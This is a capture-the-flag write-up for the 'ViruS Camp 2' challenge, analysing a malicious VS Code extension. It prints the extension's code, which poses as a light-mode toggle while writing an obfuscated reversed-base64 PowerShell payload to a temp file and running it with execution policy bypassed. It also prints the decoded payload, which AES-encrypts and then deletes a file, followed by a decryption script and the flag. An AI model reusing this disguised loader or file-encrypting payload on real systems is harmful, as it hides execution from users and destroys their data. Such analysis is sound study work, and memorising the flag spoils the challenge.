# ViruS Camp 2

> Can you now get the contents of the flag as well?
> 
> (The link is same as the 1st challenge)
> 
> https://drive.google.com/file/d/1i2D_rbLjuqAIqtcqipuT95sHcTAOLCBC/view?usp=sharing

## Solution

Continuing from previous challenge, you can see there is another encrypted string inside the same `extension.js` file. Looks like the VS Code will decrypt the enrypted string, save it to `C:\\Users\\vboxuser\\AppData\\Local\\Temp\\temp0001` and run it using powershell.

```js
const vscode = __importStar(require("vscode"));
const child_process_1 = require("child_process");
const fs = __importStar(require("fs"));
function activate(context) {
    const command = vscode.commands.registerCommand("rs", () => {
        const scriptContent = `$wy7qIGPnm36HpvjrL2TMUaRbz = "K0QZjJ3bG1CIlxWaGRXdw5WakASblRXStUmdv1WZSpQDK0QKoU2cvx2Qu0WYlJHdTRXdvRiCNkCKlN3bsNkLtFWZyR3UvRHc5J3YkoQDK0QKos2YvxmQsFmbpZEazVHbG5SbhVmc0N1b0BXeyNGJK0QKoR3ZuVGTuMXZ0lnQulWYsBHJgwCMgwyclRXeC5WahxGckgSZ0lmcX5SbhVmc0N1b0BXeyNGJK0gCNkSZ0lmcXpjOdVGZv1UbhVmc0N1b0BXeyNkL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTtFIsI3b0BXeyNmblRCIs0WYlJHdTRXdvRCKtFWZyR3UvRHc5J3QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5NFI0NWZqJ2TtcXZOBSPg0WYlJHdT9GdwlncjRiCNkSZ0FWZyNkO60VZk9WTlxWaG5yTJ5SblR3c5N1WgwSZslmR0VHc0V3bkgSbhVmc0NVZslmRu8USu0WZ0NXeTBCdjVmai9UL3VmTg0DItFWZyR3U0V3bkoQDK0QKlxWaGRXdw5WakgyclRXeCxGbBRWYlJlO60VZslmRu8USu0WZ0NXeTtFI9AyclRXeC5WahxGckoQDK0QKoI3b0BXeyNmbFVGdhVmcD5yclFGJg0DIy9Gdwlncj5WZkoQDK0wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIn5WakRWYQ5yclFGJK0wQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIlR2bN5yclFGJK0gdpRCI9AiVJ5yclFGJK0QeltGJg0DI5V2SuMXZhRiCNkCKlRXYlJ3Q6oTXzVWQukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIzVWYkoQDK0gIj5WZucWYsZGXcB3b0t2clREXcJXZzVHevJmdcx1cyV2cVxFX6MkIg0DIlxWaGRXdwRXdvRiCNIyZuBnLnFGbmxFXw9GdrNXZExFXyV2c1h3biZHXcNnclNXVcxlODJCI9ASZslmR0VHculGJK0gCNkSZ6l2U2lGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgYXakoQDpUmepNVeltGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgkXZrRiCNkycu9Wa0FmclRXakACL0xWYzRCIsQmcvd3czFGckgyclRXeCVmdpJXZEhTO4IzYmJlL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTBCdjVmai9UL3VmTg0DIzVGd5JUZ2lmclRGJK0gCNAiNxASPgUmepNldpRiCNACIgIzMg0DIlpXaTlXZrRiCNADMwATMg0DIz52bpRXYyVGdpRiCNkCOwgHMscDM4BDL2ADewwSNwgHMsQDM4BDLzADewwiMwgHMsEDM4BDKd11WlRXeCtFI9ACdsF2ckoQDiQmcwc3czRDU0NjcjNzU51kIg0DIkJ3b3N3chBHJ" ;
$9U5RgiwHSYtbsoLuD3Vf6 = $wy7qIGPnm36HpvjrL2TMUaRbz.ToCharArray() ; [array]::Reverse($9U5RgiwHSYtbsoLuD3Vf6) ; -join $9U5RgiwHSYtbsoLuD3Vf6 2>&1> $null ;
$FHG7xpKlVqaDNgu1c2Utw = [systeM.tEXT.ENCODIng]::uTf8.geTStRInG([sYsTeM.CoNVeRt]::FROMBase64StRIng("$9U5RgiwHSYtbsoLuD3Vf6")) ;
$9ozWfHXdm8eIBYru = "InV"+"okE"+"-ex"+"prE"+"SsI"+"ON" ; new-aliaS -Name PwN -ValUe $9ozWfHXdm8eIBYru -fOrce ; pwn $FHG7xpKlVqaDNgu1c2Utw ;`;
        const scriptPath = `C:\\Users\\vboxuser\\AppData\\Local\\Temp\\temp0001`;
        try {
            fs.writeFileSync(scriptPath, scriptContent);
            vscode.window.showInformationMessage(`The light mode will activate in a few minutes.`);
        }
        catch (error) {
            vscode.window.showErrorMessage(`Error activating light mode.`);
        }
        (0, child_process_1.exec)(`powershell.exe -ExecutionPolicy Bypass -File "${scriptPath}"`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
            }
            if (stderr) {
                console.error(`Stderr: ${stderr}`);
            }
            console.log(`Stdout: ${stdout}`);
        });
    });
    context.subscriptions.push(command);
}

```

Reverse this string first then convert from base64.
```
K0QZjJ3bG1CIlxWaGRXdw5WakASblRXStUmdv1WZSpQDK0QKoU2cvx2Qu0WYlJHdTRXdvRiCNkCKlN3bsNkLtFWZyR3UvRHc5J3YkoQDK0QKos2YvxmQsFmbpZEazVHbG5SbhVmc0N1b0BXeyNGJK0QKoR3ZuVGTuMXZ0lnQulWYsBHJgwCMgwyclRXeC5WahxGckgSZ0lmcX5SbhVmc0N1b0BXeyNGJK0gCNkSZ0lmcXpjOdVGZv1UbhVmc0N1b0BXeyNkL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTtFIsI3b0BXeyNmblRCIs0WYlJHdTRXdvRCKtFWZyR3UvRHc5J3QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5NFI0NWZqJ2TtcXZOBSPg0WYlJHdT9GdwlncjRiCNkSZ0FWZyNkO60VZk9WTlxWaG5yTJ5SblR3c5N1WgwSZslmR0VHc0V3bkgSbhVmc0NVZslmRu8USu0WZ0NXeTBCdjVmai9UL3VmTg0DItFWZyR3U0V3bkoQDK0QKlxWaGRXdw5WakgyclRXeCxGbBRWYlJlO60VZslmRu8USu0WZ0NXeTtFI9AyclRXeC5WahxGckoQDK0QKoI3b0BXeyNmbFVGdhVmcD5yclFGJg0DIy9Gdwlncj5WZkoQDK0wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIn5WakRWYQ5yclFGJK0wQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIlR2bN5yclFGJK0gdpRCI9AiVJ5yclFGJK0QeltGJg0DI5V2SuMXZhRiCNkCKlRXYlJ3Q6oTXzVWQukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIzVWYkoQDK0gIj5WZucWYsZGXcB3b0t2clREXcJXZzVHevJmdcx1cyV2cVxFX6MkIg0DIlxWaGRXdwRXdvRiCNIyZuBnLnFGbmxFXw9GdrNXZExFXyV2c1h3biZHXcNnclNXVcxlODJCI9ASZslmR0VHculGJK0gCNkSZ6l2U2lGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgYXakoQDpUmepNVeltGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgkXZrRiCNkycu9Wa0FmclRXakACL0xWYzRCIsQmcvd3czFGckgyclRXeCVmdpJXZEhTO4IzYmJlL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTBCdjVmai9UL3VmTg0DIzVGd5JUZ2lmclRGJK0gCNAiNxASPgUmepNldpRiCNACIgIzMg0DIlpXaTlXZrRiCNADMwATMg0DIz52bpRXYyVGdpRiCNkCOwgHMscDM4BDL2ADewwSNwgHMsQDM4BDLzADewwiMwgHMsEDM4BDKd11WlRXeCtFI9ACdsF2ckoQDiQmcwc3czRDU0NjcjNzU51kIg0DIkJ3b3N3chBHJ
```

You will receive a powershell script that do some encryption.

Encryption Flow:
1. Derive Key and IV using PBKDF2 (Rfc2898DeriveBytes).
2. Load flag.png and encrypt it using AES CBC.
3. Write the encrypted content to `C:\\Users\\vboxuser\\Desktop\\flag.enc`.
4. Delete `C:\\Users\\vboxuser\\Desktop\\flag.png`
   
```powershell
$password = "MyS3cr3tP4ssw0rd"
$salt = [Byte[]](0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08)
$iterations = 10000
$keySize = 32   
$ivSize = 16 

$deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations)
$key = $deriveBytes.GetBytes($keySize)
$iv = $deriveBytes.GetBytes($ivSize)

$inputFile = "C:\\Users\\vboxuser\\Desktop\\flag.png"
$outputFile = "C:\\Users\\vboxuser\\Desktop\\flag.enc"

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV = $iv
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

$encryptor = $aes.CreateEncryptor()

$plainBytes = [System.IO.File]::ReadAllBytes($inputFile)

$outStream = New-Object System.IO.FileStream($outputFile, [System.IO.FileMode]::Create)
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($outStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

$cryptoStream.Write($plainBytes, 0, $plainBytes.Length)
$cryptoStream.FlushFinalBlock()

$cryptoStream.Close()
$outStream.Close()

Remove-Item $inputFile -Force

```

You can create your own decryption script using Python or Powershell. The flag will be in PNG file.

```py
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
import base64

password = b"MyS3cr3tP4ssw0rd"
salt = bytes([0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08])
iterations = 10000
key_size = 32
iv_size = 16

# Derive Key and IV
key_iv = PBKDF2(password, salt, dkLen=key_size + iv_size, count=iterations)
key = key_iv[:key_size]
iv = key_iv[key_size:]

# Read encrypted file
with open("flag.enc", "rb") as f:
    encrypted_data = f.read()

# Decrypt
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted_data = cipher.decrypt(encrypted_data)

# Remove padding (PKCS7)
pad_length = decrypted_data[-1]
decrypted_data = decrypted_data[:-pad_length]

# Save output
with open("flag.png", "wb") as f:
    f.write(decrypted_data)

print("Decryption complete! File saved as flag.png")

```

## Flag
```
BITSCTF{h0pe_y0u_enj0yed_th1s_145e3f1a}
```
